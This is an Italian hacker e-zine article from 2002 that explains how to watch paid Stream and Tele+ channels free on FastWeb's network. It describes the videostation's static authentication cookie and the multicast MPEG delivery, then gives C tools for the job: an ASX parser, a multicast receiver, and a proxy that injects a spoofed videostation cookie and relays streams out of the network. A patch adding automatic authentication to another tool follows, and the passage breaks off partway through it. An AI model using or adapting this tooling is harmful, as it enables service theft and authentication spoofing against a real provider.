==============================================================================
--------------------[ BFi11-dev - file 12 - 10/09/2002 ]----------------------
==============================================================================


-[ DiSCLAiMER ]---------------------------------------------------------------
        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
        ed educativi. Gli autori di BFi non si riterranno in alcun modo
        responsabili per danni perpetrati a cose o persone causati dall'uso
        di codice, programmi, informazioni, tecniche contenuti all'interno
        della rivista.
        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
        ti assumi ogni genere di responsabilita` per l'uso che farai delle
        informazioni contenute in BFi.
        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
        della rivista: distribuite BFi nella sua forma integrale ed originale.
------------------------------------------------------------------------------


-[ HACKiNG ]------------------------------------------------------------------
---[ FASTWEB: V0RRETE DiRL0 A TUTTi (R0UND 2)
-----[ tHE rECIdjVO <recidjvo@s0ftpj.org>



                -=[ FASTWEB: VORRETE DIRLO A TUTTI (round 2) ]=-



* 0x00 - Index

	* 0x00 - Index
	* 0x01 - Intro
	* 0x02 - Ancora una volta. Sogno e visione
	* 0x04 - Un po' di storia, che non fa mai male
	* 0x08 - Finalmente ci siamo
	* 0x10 - Alla fine era tutto qui
	* 0x20 - Dai, qualcosa in piu`!
	* 0x40 - Tanti formati, ma alla fine ci siamo
	* 0x80 - Ancora piu` terra terra
	* 0xff + 0x01 - Software and more..



* 0x01 - Intro

Beh insomma, c'e` chi se l'aspettava, chi meno; c'e` chi ci sperava, chi
invece si era completamente dimenticato di questo lavoro.
Cosa dire? Io non me ne ero dimenticato. Io non me ne sono dimenticato. Io,
non dimentico.
L'altra volta ci siamo lasciati con una promessa, ed eccomi qui, pronto per
un altro round, pronto ancora a mostrare al mondo come non si possa vivere e
pianificare il lavoro pensando che in giro tutti siano un branco di poveri
mentecatti, che non si metteranno mai a studiare quello che li circonda.

Perdonatemi se non saro` troppo preciso nell'indicarvi quello che serve, o se
vi sembrero` come al solito vacuo e strano nel mio modo di atteggiarmi alla
scrittura, ma in fondo quello che conta penso sia una cosa sola:

A MODO MIO, MA LO STO DICENDO NUOVAMENTE A TUTTI.



* 0x02 - Ancora una volta. Sogno e visione

Gia`.. capita che a volte succeda di nuovo.
Un viaggio, un treno, la solita destinazione, la solita illuminazione, un
sorriso di compiacimento, l'euforia di un bambino che ritorna ancora..
Ancora..
Ancora.
Cosi` capita che, dopo notti insonni a leggersi i dump del traffico di rete
accumulato in altrettanti notti passate insonni, con un po' di fortuna e con
un po' di logica, si possa arrivare senza troppi problemi a svelare una cosa
che, beh insomma, magari ancora non e` un gran che, ma che per quello che mi
riguarda reputo una faccenda molto simpatica :D

Ma cosa posso farci, ancora quel tremendo sentimento..
Faro` bene a dirlo? Non avro` problemi? Vale la pena rischiare di perdere
quello che mi sono guadagnato a forza di sacrifici per continuare la mia
traversata con stretti i miei pensieri e le mie convinzioni?
E se poi dovesse andare male, e mi ritrovassi in un'aula di tribunale..
Ancora. La visione.

Ecco che si materializza.. e` proprio il mio incubo. L'aula di un tribunale,
io che sto vedendo il mio avvocato che si scanna con la pubblica accusa, per
cercare all'ultimo di salvarmi.. Forse un monito inconscio che sarebbe meglio
abbandonare tutto?
Poi, al momento decisivo, il giudice chiede silenzio.. Una strana sensazione
di timore e di freddo mi pervade..
Eccolo, sta chiamando i due uomini che fino a poco fa urlavano parole di sfida
vicino a se, sull'aula scende un silenzio quasi palpabile.. Ecco, sta per
parlare..

"Dunque.. con FastWeb ho scoperto la TV on Demand e sono libero dagli orari
dei programmi televisivi vedo quello che voglio quando voglio."

E poi ancora la solita voce calma e felice:

"NON STUPITEVI SE SENTIRETE IL DESIDERIO IRREFRENABILE DI DIRLO A QUALCUNO.
FASTWEB, VORRETE DIRLO A TUTTI."

E se un giudice lo dice, come potra` condannarmi se lo dico anche io? =)



* 0x04 - Un po' di storia, che non fa mai male

Naah, non preoccupatevi, vi avevo gia` avvisato a proposito :D
Non sono nella condizione mentale di parlarvi dettagliatamente di tutti i
casini che ci sono stati dietro, quindi poche nozioni di base, un po' di
retorica descrittiva, qualche utiity che puo` sempre tornare utile a chi si
vuole guadagnare veramente qualcosa, e poi via, la vostra fantasia e la
curiosita` che vi deve contraddistinguere, sempre.

Un compromesso alla fine: la storia e` grossa, non chiedetemi di darvi tutto.
Le cose vanno guadagnate, non posso certo mettermi a creare un nuovo esercito
di video-kid, viste le mie note paternali che faccio in merito.. Vedetela
cosi`: qui c'e` la tecnica, ci sono le idee, c'e` il codice, voi metteteci la
parte puramente illegale della questione, con il doppio scopo di lasciarmi
alle spalle eventuali problemi legali, di evitare uno spargimento di sangue e
un colpo al cuore dei poveri gestori di questi servizi, che, anche se non
posso apprezzare il modo in cui si pongono i problemi lavorativi, in fondo
sono sempre esseri umani.
Spero proprio che questa mia scelta non porti a un mercato di codici di
abilitazione, spero di non dover mai sentire che si faccia trading di
informazione a questi scopi.
Se siete utenti legalmente autorizzati a usufruire del servizio, e siete
giustamente curiosi di sapere cosa sta succedendo sulla vostra rete, nelle
vostre case, beh mettete in conto un paio di notti in compagnia di un tcpdump,
e vedrete che non ci sara` il minimo problema.. In caso contrario,
ingegnatevi, cercate di scervellarvi su come possiate raggiungere il vostro
scopo, ma vi prego, non fate la cosa che piu` odio, e non per strane mie
manie, ma perche` vedo sprecato spesso un potenziale talento, e cio` e` una
delle cose che non posso accettare.

Sono disponibile ad ogni chiarimento, ma che siano chiarimenti, capite cosa
intendo..
E se proprio vi interessa un racconto fantastico su questi mesi di analisi
folle, beh, in quel caso offritemi un bicchiere di porto, e seduti ad un pub
come vecchi amici, saro` felice di intrattenervi per quanto lo riterrete
opportuno con i racconti di un vecchio..

Intanto leggete questo, studiate, immaginate, supponete, sperimentate,
fallite, ritentate e ritentate.. Alla fine qui c'e` di che stimolare la vostra
curiosita`.
Altrimenti sedetevi e aspettate che esca la soluzione definitiva, comoda,
senza bisogno di ingegno da parte vostra, che sicuramente tra un po' apparira`
anche pubblicamente. Se davvero e` questo che volete.



* 0x08 - Finalmente ci siamo

Abbiamo detto di farla breve, no? E allora saremo crudi e brutali.
Scopo della missione: poter vedere i canali di Stream e Tele+, gratis, sul
proprio televisore o sul proprio computer, senza dover fare altro che spendere
5 minuti leggendo questo documento e sistemando i prototipi di programmi che
troverete in seguito. Non me ne voglia Murdock.

Ah dimenticavo, ma penso che fosse sottointeso. Ci serve un abbonamento
FastWeb, anche solo telefono tutto a consumo, basta che sia un link in fibra
(non le adsl per intenderci) e che abbia ip privato di MAN FastWeb. Questa
almeno deve essere la base, volendo possiamo anche avere altro :>

Risultato: praticamente tutti i canali Stream, Tele+ Bianco, Tele+ Nero,
Tele+ Grigio, Tele+ 16:9, e per finire in bellezza, tutta la programmazione di
Palco (che dopo le 23 diventa Hot Club, mmmmmmmm :>).

Se vi pare che questo prospetto valga l'inseguimento attraverso questi appunti
disordinati e volutamente incompleti, seguitemi, altrimenti fate un po' voi.

So che ultimamente ci sono parecchie persone che si sentono molto elite
perche` si vedono la televisione via satellite gratis, usando schede clonate
di cui altro non conoscono che scaricarsi un'immagine e lanciare il programma
per inciderla sulla carta. Ma cosa vi da' questo se non vedervi la
televisione? E credete che sia costruttivo? Non sono molto diversi da quelli
che si passano gli account dei green su irc.. Io ho trovato il mio modo per
vedere la televisione senza passare dalle vie canoniche, c'e` chi spende le
notti in modi sicuramente piu` gratificanti per lui, beh io sono fatto cosi`,
mi ci sono impegnato, ci sono riuscito, e ora vediamo cosa succedera`.

E poi da quel poco che conosco di quel mondo legato al satellite, con
l'avvento di SECA2 siamo messi un po' peggio, eh? Perche`, perche` in realta`
le nostre conoscenze non esistono e quindi non avendo piu` la meccanica azione
di autoaggiornamento ci sentiamo sperduti.. Se invece vi siete fatti il culo
per ore e ore non potrete fare altro che sorridere e risolvere questo piccolo
problema in maniera facile e divertente :>

E se vi state chiedendo se questo e` un disclaimer, beh, lo e`.



* 0x10 - Alla fine era tutto qui

Vediamo a questo punto come funziona il sistema televisivo di FastWeb.
Attraverso una macchinetta chiamata videostation, attaccata direttamente al
CPV che avete in casa, e previo pagamento del canone di abbonamento e di
noleggio dell'hardware, potrete accedere ai servizi di TV on Demand, e cosa
sicuramente molto appetitosa, ai canali di Stream e di Tele+.

Bene, ma pensavano davvero che nessuno avrebbe detto 1 mattina: "Ehi, ma se io
attacco l'aggeggio con un rj45, e tenendo conto che tutti i servizi FastWeb
sono distribuiti su IP, non e` che magari, cosi`, per caso, riesco a capire
come funziona la videostation e magari emularla per vedermi a scrocco la tv?
Scelte commerciali temo, e in quel campo io non oso metterci bocca.
Beh e` arrivato il momento di pensarci un po' su, che ne dite?

In questo round non mi occupero` di come funzioni la videostation di per se`,
o di cosa sia, sara` prossima e approfondita trattazione. Vediamo pero` almeno
la parte che ci interessa, quella relativa all'autenticazione verso i server
di Stream e Tele+.
Tutto si svolge su una semplice transazione HTTP, in poche parole all'interno
della videostation ci sta un browser che si collega ai server di streaming di
FastWeb e...
Cookie.
Semplice, lineare, normalissimo, http cookie.
Gia`, come al solito il gioco e` gia` finito.. o quasi :D La parte difficile
(davvero era difficile? =) era arrivare a studiare bene come era strutturato
il tutto, comunque devo dire che e` stato un ottimo esercizio per la mente, se
non per il corpo :D

Insomma, il client altro non fa che collegarsi al server principale (una delle
poche notizie specifiche che posso darvi) http://webdvd.fastweb.tv/, e
passando questo cookie magico di autenticazione (e` univoco per ogni
videostation), viene rediretto a tutta la parte di gestione a cui
normalmente accedete tramite il vostro televisore e la videostation. E poi?
Beh, il resto altro non e` che MPEG, e voglia il cielo che questo sia un
problema.

Bene, altro non vi serve, buona visione :D



* 0x20 - Dai, qualcosa in piu`!

Ok ok lo ammetto, forse sono stato davvero un po' troppo rapido nell'esporre
le cose..
Riprendiamo con calma, analizzando un po' di dettagli tecnici che vi faranno
risparmiare parecchie notti dietro ai dump di rete :D

WebDVD=STBsn=KR0000000000&MAC=00:00:00:00:00:00&IP=0.0.0.0&HR=HR0000000000000

STBsn e HR sono due codici seriali che rilasciano associati alla videostation,
mentre MAC e` l'indirizzo hardware della scheda fast ethernet della
videostation.
IP e` l'ip, ma ovviamente essendo preso via DHCP al boot, non e` soggetto a
controllo. Gli altri sono una tripla registrata da qualche parte sul server di
streaming.. Quando vi collegate la prima volta su http://webdvd.fastweb.tv/,
il cookie viene valutato e, a seconda dei casi, si viene reindirizzati su una
pagina di autenticazione con una strings di GET, oppure sulla pagina non
abilitata alla visione.
In poche parole, se vi collegate con il vostro browser senza mandare il cookie
finite su www.fastweb.it :>
Ma passando il cookie corretto e seguendo i link arrivate diretti dove volete,
e avete abilitato tutto quello che normalmente avete con quell'account.

Dunque tutto si riduce a un cookie?
Beh, si` e no..
Mettiamola cosi`: tutta la parte di gestione si riduce a questo, ma poi lo
scopo finale sara` ovviamente vedersi i programmi, e questi come arrivano?

Facciamo quindi una distinzione tra filmati statici e programmi in streaming.
Entrambi utilizzano la codifica MPEG (alcuni la 1, altri la 2), ma cio` non ci
importa; la principale differenza e` che quelli statici noi li vediamo
dall'inizio alla fine, partono esattamente quando vogliamo noi. Infatti altro
non sono che file .mpg, e ce li prendiamo direttamente via HTTP dal server che
ce li fornisce :D

Per quanto riguarda la programmazione in streaming (che poi e` il metodo con
cui vengono diffusi Stream e Tele+), altro non e` che trasmissione MPEG su
gruppi multicast.
Ovvero, noi ci attacchiamo al gruppo multicast giusto e ci arriva direttamente
il filmato, possibile? Beh, e` cosi`, cosa posso farci, io?



* 0x40 - Tanti formati, ma alla fine ci siamo

Il passaggio intermedio e` comprendere i file ASX che ci vengono ritornati dal
server di streaming..
ASX e` un formato che ci comunica i dati ai quali e` reperibile il nostro
contenuto (normalmente un ASF, nel nostro invece MPEG).
Vediamo i due tipi possibili di ASX che tratteremo:

- ASX standard - static mpeg

<ASX version="3">
        <PARAM NAME="Server" VALUE="FastWeb/3.1337" />
        <Entry>
                <ref HREF="http://1.2.3.4:12345/Video/Fastweb/Unicast.mpg" />
        </Entry>
</ASX>

Beh credo che questo esempio parli da solo :D

- pseudo-ASX - streaming mpeg

<Multicast_Playlist>
	<General_information>
		<agent_IP>10.20.30.40</agent_IP>
		<client_ID>WebDVD</client_ID>
		<txn_ID>9877</txn_ID>
		<player>c:\Agent\iPlayer.exe</player>
		<vs_type>BB</vs_type>
		<composer_resolution>720 576</composer_resolution>
		<start_channel>FastBoysTV</start_channel>
		<creation_date>05-31-2002</creation_date>
		<author>fastboys</author>
	</General_information>
	<Startup_actions>
		<a1>playvideo</a1>
	</Startup_actions>
	<Gold_Bouquet>
	<FastBoysTV>
		<D_Address>224.0.0.1</D_Address>
		<UDP_Port>12345</UDP_Port>
		<Ch_number>1</Ch_number>
	</FastBoysTV>
	</Gold_Bouquet>
	<Keyboard_events>
		<Play>
			<map_to_key>p</map_to_key>
			<click_actions>
				<a1>PLAYVIDEO</a1>
			</click_actions>
		</Play>
		<Stop>
			<map_to_key>s</map_to_key>
			<click_actions>
				<a1>STOPVIDEO</a1>
			</click_actions>
		</Stop>
		<Pause>
			<map_to_key>h</map_to_key>
			<click_actions>
				<a1>PAUSEVIDEO</a1>
			</click_actions>
		</Pause>
		<ZappingUP>
			<map_to_key>f</map_to_key>
			<click_actions>
				<a1>CHANGECHANNELUP</a1>
			</click_actions>
		</ZappingUP>
		<ZappingDown>
			<map_to_key>r</map_to_key>
			<click_actions>
				<a1>CHANGECHANNELDOWN</a1>
			</click_actions>
		</ZappingDown>
	</Keyboard_events>
</Multicast_Playlist>

Le uniche note interessanti sono il gruppo multicast (D_Address) e la porta
udp sulla quale si riceveranno i dati (UDP_Port)

Altro non ci serve! :>

Una volta che abbiamo questi dati, nel caso di flusso statico basta
richiederlo via HTTP, mentre nel secondo dovremmo fare la join al gruppo
multicast specificato su quella porta specifica, e le simpatiche VLAN create
sui Catalyst in cantina (sempre loro, sempre lorooo :>) faranno il resto :D
Da notare che lo streaming che ci arriva via multicast non e` un flusso rtp,
ma puro e semplice MPEG :D



* 0x80 - Ancora piu` terra terra

Bene, non avete capito nulla? OTTIMO :D
In fondo era il mio scopo, eheheh..
A parte gli scherzi, ve l'ho detto, mi spiace, ma non e` il periodo giusto per
me..
La teoria che ho dato basta per chiunque si intenda un minimo di reti, di
protocolli e di smanettare qualche notte cercando la via giusta..
Per aiutare tutti gli altri ho preparato una piccola suite di programmi che vi
daranno una mano :D
Ahime`, sono tutti senza commenti, ma sono davvero semplici.. al massimo e` la
volta buona che mettete mano a qualche manuale di reti e di c, cosa molto
divertente.. :D
Anzi gia` che ci sono, non garantisco ne` che funzionino, ne` che siano sicuri
dal punto di vista della programmazione. Sono appunti di codice, sono flussi
di coscienza da cui prendere libero spunto, ecco, questo sono.

Ognuno dei programmi puo` venire compilato in modalita` di debug o meno,
semplicemente aggiungendo nei Makefile come opzione da passare al compilatore
-DFASTREAM_DEBUG; la differenza sta nel fatto che puo` essere utile per
diagnostica (messaggi sullo stderr), ma a volte e` necessario disattivarlo per
evitare output indesiderato (ad esempio se lanciati da processi di inetd, i
programmi potrebbero tornare stderr su stdout creando garbage in uscita).

Quasi tutti sono pensati per essere eseguiti in pipe, oppure con una exec()
alla fine che e` definibile come meglio si crede: cosi` come sono non hanno
utilita` eccessiva, ma sistemati a dovere sono veramente potenti, fidatevi :D

Vediamoli ora in dettaglio.



* 0xff + 0x01 - Software and more..

Ricordate: appunti, non programmi. Leggete almeno le prime righe di ogni file,
e sistemate i define per far funzionare qualcosa. Altrimenti, beh temo che
dovrete cercare un'altra fonte di divertimento (l'ho detto e lo ripeto, non
voglio assolutamente creare un esercito di video-kids!).

ASuX: semplice, efficace. Prende un file, riconosce il formato (ASX o
pseudo-ASX), e ne estrae i parametri necessari per richiedere il flusso MPEG.

<-| fastream/ASuX.c |->
 /*** FASTREAM suite ********************************************
 *                        _    ____       __  __                *
 *                       / \  / ___| _   _\ \/ /                *
 *                      / _ \ \___ \| | | |\  /                 *
 *                     / ___ \ ___) | |_| |/  \                 *
 *                    /_/   \_\____/ \__,_/_/\_\                *
 *                                                              *
 *             tHE rECIdjVO - <recidjvo@s0ftpj.org>             *
 *                                                              *
 *               *** DEVEL/UNTESTED/UNSTABLE ***                *
 *                                                              *
 ******************************************** fastboys, 2002 ***/

#define EXEC_UNI 
#define EXEC_MULTI 
//#define EXEC_UNI execl(..)
//#define EXEC_MULTI execl(..)

#ifdef FASTREAM_DEBUG
        #define debug(x...) fprintf(stderr, x)
#else
        #define debug(x...)
#endif

#define ASX_UNI "<ASX "
#define ASX_MULTI "<Mult"
#define TOK_UNI "<ref HREF="
#define TOK_MULTI1 "<D_Address>"
#define TOK_MULTI2 "<UDP_Port>"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void);
void unicast_asx(void);
void multicast_asx(void);

int main()
{
        char buff[24];

        debug("ASuX devel-version, fastboys 2002.\n");

        fgets(buff, sizeof(buff), stdin);
        if(!strncasecmp(ASX_UNI, buff, strlen(ASX_UNI))) {
                debug("Detected ASX Unicast format");
                unicast_asx();
        } else if(!strncasecmp(ASX_MULTI, buff, strlen(ASX_MULTI))) {
                debug("Detected pseudo-ASX Multicast format");
                multicast_asx();
        } else {
                debug("No format detected.\n");
        }

        exit(0);
}

void unicast_asx()
{
        char buff[1024], *b;
        while(fgets(buff, sizeof(buff), stdin) != (char *)NULL) {
                if((b = strstr(buff, TOK_UNI)) != (char *)NULL) {
                        b = strtok(b + strlen(TOK_UNI), "\"");
                        debug(" (%s)\n", b);
                        break;
                }
                bzero(buff, sizeof(buff));
        }

        EXEC_UNI;

        return;
}

void multicast_asx()
{
        char buff[1024], *b;
        char multi_ip[16];
        char multi_port[6];

        while(fgets(buff, sizeof(buff), stdin) != (char *)NULL) {
                if((b = strstr(buff, TOK_MULTI1)) != (char *)NULL) {
                        b = strtok(b, "<");
                        snprintf(multi_ip, 16, "%s", b + strlen(TOK_MULTI1) - 1);
                        debug(" (%s", multi_ip);
                } else if((b = strstr(buff, TOK_MULTI2)) != (char *)NULL) {
                        b = strtok(b, "<");
                        snprintf(multi_port, 6, "%s", b + strlen(TOK_MULTI2) - 1);
                        debug(" %s)\n", multi_port);
                }
                bzero(buff, sizeof(buff));
        }

        EXEC_MULTI;

        return;
}
<-X->


MultoKrast: yeee!!! :> Er mejo della suite! Quello che fa non sorprende
nessuno, ma a me ha sorpreso quanto fosse semplice giocare in multicast!
Passategli i parametri giusti e vedrete, VEDRETE! :D

<-| fastream/MultoKrast.c |->
 /*** FASTREAM suite ********************************************
 *         __  __       _ _        _  __              _         *
 *        |  \/  |_   _| | |_ ___ | |/ /_ __ __ _ ___| |_       *
 *        | |\/| | | | | | __/ _ \| ' /| '__/ _` / __| __|      *
 *        | |  | | |_| | | || (_) | . \| | | (_| \__ \ |_       *
 *        |_|  |_|\__,_|_|\__\___/|_|\_\_|  \__,_|___/\__|      *
 *                                                              *
 *            tHE rECIdjVO - <recidjvo@s0ftpj.org>              *
 *              (unerasable thanks to nextie :>)                *
 *                                                              *
 *               *** DEVEL/UNTESTED/UNSTABLE ***                *
 *                                                              *
 ******************************************** fastboys, 2002 ***/

#ifdef FASTREAM_DEBUG
        #define debug(x...) fprintf(stderr, x)
#else
        #define debug(x...)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[]);
void scanexit(int signaln);

int main(int argc, char *argv[])
{
        int sock;
        struct sockaddr_in saddr;
        struct ip_mreq mr;
        int dlen, slen = sizeof(struct sockaddr_in);
        char buf[(16 * 1024)];

        debug("MultoKrast devel-version, fastboys 2002.\n");

        if(argc < 3) {
                debug("usage: %s <multicast_ip> <port> [scan_time]\n", argv[0]);
                exit(-1);
        }

        if(!IN_MULTICAST(ntohl(inet_addr(argv[1])))) {
                debug("usage: %s <multicast_ip> <port>\n", argv[0]);
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0) {
                debug("socket()\n");
                exit(-1);
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = inet_addr(argv[1]);
        saddr.sin_port = htons(atoi(argv[2]));
        if(bind(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
                debug("bind()\n");
                exit(-1);
        }

        mr.imr_multiaddr = saddr.sin_addr;
        mr.imr_interface.s_addr = htonl(INADDR_ANY);
        if(setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP, (void *)&mr, sizeof(mr)) < 0) {
                debug("setsockopt()\n");
                exit(-1);
        }

        if(argc == 4) {
                signal(SIGALRM, scanexit);
                alarm(atoi(argv[3]));
                debug("Scanning mode: %s %s for %d seconds.     ", argv[1], argv[2], atoi(argv[3]));
        }

        while(1) {
                if((dlen = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&saddr, &slen)) <= 0) {
                        debug("recvfrom()\n");
                        exit(-1);
                }
                debug("\b\b\b\bDATA");
                write(STDOUT_FILENO, buf, dlen);
        }

        debug("\n");

        exit(0);
}

void scanexit(int signaln)
{
        debug("\n");
        exit(0);
}
<-X->


mmm: questo miniframmento di codice implementa una sorta di rozzo proxy HTTP
che modifica le richieste del browser per farlo apparire piu` simile alla
videostation (con l'aggiunta statica ai cookies dell'autenticazione. Nel
caso venga richiesto un URL multicast, puo` lanciare direttamente MultoKrast
(o chi per esso) con l'iniezione degli header HTTP in modo da trasformare il
flusso MPEG in unicast HTTP (molto utile per fare uscire il flusso MPEG dalla
rete fastweb trasformando da UDP a TCP il metodo di trasmissione, unica
avvertenza, ricordate che quasi tutti i filmati in multicast sono da
4Megabit/s).

<-| fastream/mmm.c |->
 /*** FASTREAM suite ********************************************
 *                                                              *
 *                  _ __ ___  _ __ ___  _ __ ___                *
 *                 | '_ ` _ \| '_ ` _ \| '_ ` _ \               *
 *                 | | | | | | | | | | | | | | | |              *
 *                 |_| |_| |_|_| |_| |_|_| |_| |_|              *
 *                                                              *
 *            tHE rECIdjVO - <recidjvo@s0ftpj.org>              *
 *                                                              *
 *               *** DEVEL/UNTESTED/UNSTABLE ***                *
 *                                                              *
 ******************************************** fastboys, 2002 ***/

#define VIDEOSTATION_AUTHCODE "WebDVD=STBsn=KR0000000000&MAC=00:00:00:00:00:00&IP=0.0.0.0&HR=HR0000000000000"
#define MULTI_HEADERS_FILE "/usr/local/etc/multicast"
#define EXEC_MULTI execl("/usr/local/bin/MultoKrast", "MultoKrast", host, cport, NULL)

#ifdef FASTREAM_DEBUG
        #define debug(x...) fprintf(stderr, x)
#else
        #define debug(x...)
#endif

#define HTTP_PROTO "http://"
#define HTTP_PORT 80
#define HEADER_AGENT "User-Agent: Mozilla/4.78 [en] (X11; U; Linux.2.4.12.i586; Nav)\n"
#define HEADER_AGENT_KEYLEN 12
#define HEADER_KEEPALIVE "Connection: Keep-Alive"
#define HEADER_COOKIE "Cookie: " VIDEOSTATION_AUTHCODE
#define HEADER_COOKIE_KEYLEN 8

#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void);
void multicast_headers(void);
int resolv4(char *hostname, struct sockaddr_in *saddr);

int main()
{
        char firstline[1024], newline[1024], *host = (char *)NULL, *path = (char *)NULL, cport[6];
        short unsigned int port;

        int sock;
        struct sockaddr_in saddr;

        fgets(firstline, sizeof(firstline), stdin);

        if(strchr(firstline, ' ') == (char *)NULL) {
                debug("Only http proxy support.\n");
                exit(-1);
        }
        host = (char *)((int)strchr(firstline, ' ') + 1);
        if(strncasecmp(host, HTTP_PROTO, strlen(HTTP_PROTO))) {
                debug("Only http proxy support.\n");
                exit(-1);
        }
        host = strtok((char *)((int)host + strlen(HTTP_PROTO)), "/");
        if(strchr(host, ':') == (char *)NULL) {
                port = (u_short)HTTP_PORT;
        } else {
                port = (u_short)atoi((char *)((int)strchr(host, ':') + 1));
        }
        path = (char *)((int)host + strlen(host) + 1);
        host = strtok(host, ":");
        snprintf(newline, sizeof(newline), "%s /%s", strtok(firstline, " "), path);

        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(port);
        if(resolv4(host, &saddr)) {
                debug("Unable to resolve %s\n", host);
                exit(-1);
        }

        if(IN_MULTICAST(ntohl(saddr.sin_addr.s_addr))) {
                debug("Multicast proxy request detected.\n");
                multicast_headers();
                sleep(1);
                snprintf(cport, sizeof(cport), "%d", port);
                EXEC_MULTI;
                exit(0);
        }

        debug("Unicast proxy request detected.\n");
        if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                debug("socket()\n");
                exit(-1);
        }

        if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
                debug("connect()\n");
                close(sock);
                exit(-1);
        }

        if(send(sock, newline, strlen(newline), 0) < 0) {
                debug("write()\n");
                close(sock);
                exit(-1);
        }

        port = 1;
        while(fgets(firstline, sizeof(firstline), stdin) != (char *)NULL) {
                if(!strncasecmp(firstline, HEADER_AGENT, HEADER_AGENT_KEYLEN)) {
                        strncpy(firstline, HEADER_AGENT, sizeof(firstline));
                } else if(!strncasecmp(firstline, HEADER_KEEPALIVE, strlen(HEADER_KEEPALIVE))) {
                        continue;
                } else if(!strncasecmp(firstline, HEADER_COOKIE, HEADER_COOKIE_KEYLEN)) {
                        send(sock, HEADER_COOKIE, strlen(HEADER_COOKIE), 0);
                        send(sock, ";", strlen(";"), 0);
                        send(sock, strstr(firstline, " "), strlen(strstr(firstline, " ")), 0);
                        port = 0;
                        continue;
                }

                if(!strcmp(firstline, "\r\n")) {
                        if(port) {
                                send(sock, HEADER_COOKIE, strlen(HEADER_COOKIE), 0);
                                send(sock, "\n", strlen("\n"), 0);
                        }

                        send(sock, firstline, strlen(firstline), 0);
                        break;
                }
                send(sock, firstline, strlen(firstline), 0);
        }

        while((port = read(sock, firstline, sizeof(firstline))) > 0) {
                write(STDOUT_FILENO, firstline, port);
        }

        close(sock);

        exit(0);
}

void multicast_headers()
{
        FILE *headers = (FILE *)NULL;
        char headerline[1024];

        if((headers = fopen(MULTI_HEADERS_FILE, "r")) == (FILE *)NULL) {
                debug("Error opening "  MULTI_HEADERS_FILE ".\n");
        }

        while(fgets(headerline, sizeof(headerline), headers) != (char *)NULL) {
                fprintf(stdout, "%s", headerline);
                fflush(stdout);
        }

        fclose(headers);

        fprintf(stdout, "\n");
        fflush(stdout);

        return;


}

int resolv4(char *hostname, struct sockaddr_in *saddr)
{
        struct hostent *host_data;

        if((saddr->sin_addr.s_addr = inet_addr(hostname)) != -1) {
                return(0);
        }

        if((host_data = gethostbyname(hostname)) == (struct hostent *)NULL) {
                return(-1);
        }
        memcpy(&saddr->sin_addr.s_addr, host_data->h_addr_list[0], host_data->h_length);
        return(0);
}

/* EOF */


videos.patch: un po' la chicca della collezione, applicatela all'A-team
(trovate il codice nel round 1) e potrete facilmente aggiungere
l'autenticazione automatica alla vostra videostation, in modo da abilitare
attraverso codici la vostra videostation sgarrupata! Teoricamente dovrebbe
servirvi solamente come strumento di studio iniziale, la cosa migliore e` in
qualche modo arrivare a trovare almeno un ip multicast su cui viene trasmesso
il flusso MPEG, dopodiche` fate voi, gli ip sono tutti amici e contigui, fate
poi prima a farvi un bello scan (ad esempio usando le potenzialita` di
MultoKrast come multicast network scanner (e un po' di sano bash scripting).
Createvi una vostra bella *pagina telecomando*, dalla quale potete scegliere
direttamente il programma, e poi usate mplayer o le funzionalita` di
navigazione sul web della vostra videostation per accedervi e poter scegliere
il programma che piu` vi aggrada (eheh non so come mai sento che sarete tutti
li` ad aspettare dopo le 23 Hot Club, beh se durante il giorno trovate la
programmazione Palco, tornate su quei canali la sera :D)

Giusto un paio di note tecniche: per quanto riguarda la versione delle Libnet,
bisogna usare la 1.0.2a in quanto le versioni precedenti e successive
presentano modifiche strutturali molto evidenti, e non permettono di eseguire
alcune operazioni ritenute oltremodo importanti.

<-| fastream/videos.patch |->
--- A-team.c	2002-03-22 00:00:00.000000000 +0100
+++ A-team.c.patched	2002-09-02 09:59:28.000000000 +0200
@@ -5,7 +5,15 @@
 *                     / _ \ _____| __/ _ \/ _` | '_ ` _ \                      *
 *                    / ___ \_____| ||  __/ (_| | | | | | |                     *
 *                   /_/   \_\     \__\___|\__,_|_| |_| |_|                     *
-*                                                                              *
+*                                     _                                        *
+*                                   _| |_                                      *
+*                                  |_   _|                                     *
+*                 _     __           |_|                __       __            *
+*          _   __(_)___/ /__  ____  _____  ____  ____ _/ /______/ /_           *
+*         | | / / / __  / _ \/ __ \/ ___/ / __ \/ __ `/ __/ ___/ __ \          *
+*         | |/ / / /_/ /  __/ /_/ (__  ) / /_/ / /_/ / /_/ /__/ / / /          *
+*         |___/_/\__,_/\___/\____/____(_) .___/\__,_/\__/\___/_/ /_/           *
+*                                      /_/                                     *
 *                                                                              *
 *        based on HEAT - Half Ethernet Address Translation tecnology           *
 *                   tHE rECIdjVO - recidjvo@pkcrew.org                         *
@@ -13,7 +21,7 @@
 *                                                                              *
 *      Libraries needed:                                                       *
 *      - libpcap - http://www.tcpdump.org/                                     *
-*      - Libnet  - http://libnet.sourceforge.net/                              *
+*      - Libnet  - http://www.packetfactory.net/libnet/ (1.0.2a)               *
 *                                                                              *
 *   compile with:                                                              *
 *   # cc -o A-team A-team.c `libnet-config --defines --libs` -lpcap -pthread   *
@@ -21,7 +29,10 @@
 *                                                                              *
 *******************************************************************************/
 
